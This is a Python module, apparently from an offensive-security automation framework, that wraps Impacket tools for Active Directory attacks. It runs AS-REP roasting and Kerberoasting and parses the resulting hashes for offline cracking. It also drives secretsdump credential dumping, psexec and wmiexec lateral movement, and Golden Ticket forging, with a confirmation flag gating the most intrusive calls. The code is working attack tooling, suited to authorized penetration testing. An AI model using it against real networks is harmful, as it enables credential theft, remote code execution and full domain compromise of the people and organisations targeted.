"""Impacket subprocess wrappers — async, scope-respecting.

Each method shells out to the corresponding `impacket-*` script (assumed
on PATH; falls back to `python -m impacket.examples.*` if available).

If neither is installed, methods return a structured "not_installed"
result rather than raising — caller can degrade gracefully.

Approval-gated commands (psexec, secretsdump, ticketer) require an
explicit `confirmed=True` to actually execute, otherwise they return a
dry-run dict with the would-be command line.
"""

from __future__ import annotations

import asyncio
import logging
import re
import shutil
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger("viper.impacket")

# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------


@dataclass
class ImpacketResult:
    tool: str
    command: list[str]
    returncode: int
    stdout: str = ""
    stderr: str = ""
    parsed: dict = field(default_factory=dict)
    error: Optional[str] = None
    dry_run: bool = False

    @property
    def ok(self) -> bool:
        return self.error is None and self.returncode == 0 and not self.dry_run


# ---------------------------------------------------------------------------
# Tool resolution
# ---------------------------------------------------------------------------

# Map: friendly name -> (kali-style binary, python -m fallback)
IMPACKET_TOOLS = {
    "GetUserSPNs":      ("impacket-GetUserSPNs",      "impacket.examples.GetUserSPNs"),
    "GetNPUsers":       ("impacket-GetNPUsers",       "impacket.examples.GetNPUsers"),
    "secretsdump":      ("impacket-secretsdump",      "impacket.examples.secretsdump"),
    "psexec":           ("impacket-psexec",           "impacket.examples.psexec"),
    "smbexec":          ("impacket-smbexec",          "impacket.examples.smbexec"),
    "wmiexec":          ("impacket-wmiexec",          "impacket.examples.wmiexec"),
    "atexec":           ("impacket-atexec",           "impacket.examples.atexec"),
    "ticketer":         ("impacket-ticketer",         "impacket.examples.ticketer"),
    "smbclient":        ("impacket-smbclient",        "impacket.examples.smbclient"),
    "rpcdump":          ("impacket-rpcdump",          "impacket.examples.rpcdump"),
    "lookupsid":        ("impacket-lookupsid",        "impacket.examples.lookupsid"),
    "ntlmrelayx":       ("impacket-ntlmrelayx",       "impacket.examples.ntlmrelayx"),
    "addcomputer":      ("impacket-addcomputer",      "impacket.examples.addcomputer"),
    "GetADUsers":       ("impacket-GetADUsers",       "impacket.examples.GetADUsers"),
}


def _resolve(tool: str) -> Optional[list[str]]:
    """Return the argv prefix to invoke the tool, or None if not installed."""
    if tool not in IMPACKET_TOOLS:
        return None
    binary, py_mod = IMPACKET_TOOLS[tool]
    if shutil.which(binary):
        return [binary]
    # Try python -m fallback
    try:
        import importlib
        importlib.import_module(py_mod)
        import sys
        return [sys.executable, "-m", py_mod]
    except ImportError:
        return None


def is_available(tool: str) -> bool:
    return _resolve(tool) is not None


# ---------------------------------------------------------------------------
# Generic subprocess runner
# ---------------------------------------------------------------------------


async def _run(
    tool: str,
    args: list[str],
    *,
    timeout: float = 60.0,
    confirmed: bool = True,
    require_approval: bool = False,
) -> ImpacketResult:
    """Run an impacket tool. If require_approval and not confirmed, returns dry-run."""
    prefix = _resolve(tool)
    if prefix is None:
        return ImpacketResult(
            tool=tool, command=[tool, *args], returncode=-1,
            error=f"impacket tool '{tool}' not installed (try: pip install impacket)",
        )

    cmd = [*prefix, *args]
    if require_approval and not confirmed:
        return ImpacketResult(
            tool=tool, command=cmd, returncode=0, dry_run=True,
            parsed={"would_run": " ".join(cmd)},
        )

    logger.info("running %s", " ".join(cmd))
    try:
        proc = await asyncio.wait_for(
            asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            ),
            timeout=5.0,  # give the spawn 5s
        )
        stdout_b, stderr_b = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )
    except asyncio.TimeoutError:
        return ImpacketResult(
            tool=tool, command=cmd, returncode=-1,
            error=f"timeout after {timeout}s",
        )
    except FileNotFoundError as e:
        return ImpacketResult(
            tool=tool, command=cmd, returncode=-1, error=str(e),
        )

    return ImpacketResult(
        tool=tool, command=cmd,
        returncode=proc.returncode if proc.returncode is not None else -1,
        stdout=stdout_b.decode("utf-8", errors="replace"),
        stderr=stderr_b.decode("utf-8", errors="replace"),
    )


# ---------------------------------------------------------------------------
# High-level workflow methods
# ---------------------------------------------------------------------------


class ImpacketRunner:
    """Async, approval-aware wrapper around the Impacket suite."""

    def __init__(self, *, default_timeout: float = 60.0) -> None:
        self.default_timeout = default_timeout

    # --- pre-auth attacks ---

    async def asreproast(
        self, dc_ip: str, domain: str, users: list[str],
        *, output_file: Optional[str] = None,
    ) -> ImpacketResult:
        """ASREPRoast: dump AS-REP hashes for users without DONT_REQ_PREAUTH."""
        # SECURITY (fix #7): write user list to a tempfile and clean it up
        # in a `finally` block. The previous version used `delete=False`
        # without cleanup, leaking AD usernames to /tmp on shared CI hosts.
        import os
        import tempfile
        tf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
        try:
            tf.write("\n".join(users))
            tf.close()
            args = [f"{domain}/", "-no-pass", "-usersfile", tf.name, "-dc-ip", dc_ip]
            if output_file:
                args += ["-outputfile", output_file]
            result = await _run("GetNPUsers", args, timeout=self.default_timeout)
            result.parsed = self._parse_asrep(result.stdout)
            return result
        finally:
            try:
                os.unlink(tf.name)
            except OSError:
                pass

    async def kerberoast(
        self, dc_ip: str, domain: str, user: str, password: str,
        *, output_file: Optional[str] = None,
    ) -> ImpacketResult:
        """Kerberoast: request TGS for service accounts; crack offline."""
        args = [f"{domain}/{user}:{password}", "-request", "-dc-ip", dc_ip]
        if output_file:
            args += ["-outputfile", output_file]
        result = await _run("GetUserSPNs", args, timeout=self.default_timeout)
        result.parsed = self._parse_tgs(result.stdout)
        return result

    # --- credential dump (approval-gated) ---

    async def secretsdump(
        self, target: str, user: str, password: str = "", *,
        nthash: str = "", just_dc_user: Optional[str] = None,
        confirmed: bool = False,
    ) -> ImpacketResult:
        """secretsdump.py — dump SAM/LSA/NTDS. APPROVAL-GATED."""
        cred = f"{user}:{password}" if password else user
        if nthash:
            cred = user
            extra = ["-hashes", f":{nthash}"]
        else:
            extra = []
        target_str = f"{cred}@{target}"
        args = [target_str, *extra]
        if just_dc_user:
            args += ["-just-dc-user", just_dc_user]
        return await _run(
            "secretsdump", args, timeout=self.default_timeout,
            confirmed=confirmed, require_approval=True,
        )

    # --- lateral movement (approval-gated) ---

    async def psexec(
        self, target: str, user: str, password: str = "", *,
        nthash: str = "", command: str = "", confirmed: bool = False,
    ) -> ImpacketResult:
        """psexec.py — interactive SYSTEM shell via service install. APPROVAL-GATED."""
        cred = f"{user}:{password}" if password else user
        target_str = f"{cred}@{target}"
        args = [target_str]
        if nthash:
            args = [target_str.replace(f":{password}", "") if password else target_str,
                    "-hashes", f":{nthash}"]
        if command:
            args.append(command)
        return await _run(
            "psexec", args, timeout=self.default_timeout,
            confirmed=confirmed, require_approval=True,
        )

    async def wmiexec(
        self, target: str, user: str, password: str = "", *,
        nthash: str = "", command: str = "", confirmed: bool = False,
    ) -> ImpacketResult:
        """wmiexec.py — semi-interactive shell via WMI. APPROVAL-GATED."""
        cred = f"{user}:{password}" if password else user
        target_str = f"{cred}@{target}"
        args = [target_str]
        if nthash:
            args = [user + "@" + target, "-hashes", f":{nthash}"]
        if command:
            args.append(command)
        return await _run(
            "wmiexec", args, timeout=self.default_timeout,
            confirmed=confirmed, require_approval=True,
        )

    # --- ticket forging (approval-gated) ---

    async def golden_ticket(
        self, krbtgt_nthash: str, domain: str, domain_sid: str,
        target_user: str = "Administrator", *, confirmed: bool = False,
    ) -> ImpacketResult:
        """ticketer.py — forge a Golden Ticket. APPROVAL-GATED."""
        args = [
            "-nthash", krbtgt_nthash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            target_user,
        ]
        return await _run(
            "ticketer", args, timeout=self.default_timeout,
            confirmed=confirmed, require_approval=True,
        )

    # --- enumeration (no approval needed) ---

    async def get_ad_users(
        self, dc_ip: str, domain: str, user: str, password: str,
    ) -> ImpacketResult:
        args = [f"{domain}/{user}:{password}", "-dc-ip", dc_ip, "-all"]
        return await _run("GetADUsers", args, timeout=self.default_timeout)

    async def lookupsid(
        self, dc_ip: str, domain: str = "", user: str = "", password: str = "",
        max_rid: int = 4000,
    ) -> ImpacketResult:
        if user:
            args = [f"{domain}/{user}:{password}@{dc_ip}", str(max_rid)]
        else:
            args = [f"{domain}/@{dc_ip}", str(max_rid), "-no-pass"]
        return await _run("lookupsid", args, timeout=self.default_timeout)

    async def smbclient_shares(
        self, target: str, user: str = "", password: str = "",
    ) -> ImpacketResult:
        cred = f"{user}:{password}" if password else ""
        target_str = f"{cred}@{target}" if cred else target
        args = [target_str]
        return await _run("smbclient", args, timeout=30.0)

    # --- output parsers ---

    @staticmethod
    def _parse_asrep(stdout: str) -> dict:
        """Pull $krb5asrep$ hashes from GetNPUsers output."""
        hashes = re.findall(r"\$krb5asrep\$.+", stdout)
        users = re.findall(r"^\s*([\w.-]+)\s+", stdout, re.MULTILINE)
        return {
            "hash_count": len(hashes),
            "hashes": hashes,
            "users_with_no_preauth": users,
        }

    @staticmethod
    def _parse_tgs(stdout: str) -> dict:
        """Pull $krb5tgs$ hashes from GetUserSPNs output."""
        hashes = re.findall(r"\$krb5tgs\$.+", stdout)
        spns = re.findall(r"^\s*([\w/.-]+)\s+([\w$.-]+)\s+", stdout, re.MULTILINE)
        return {
            "hash_count": len(hashes),
            "hashes": hashes,
            "spn_user_pairs": spns,
        }
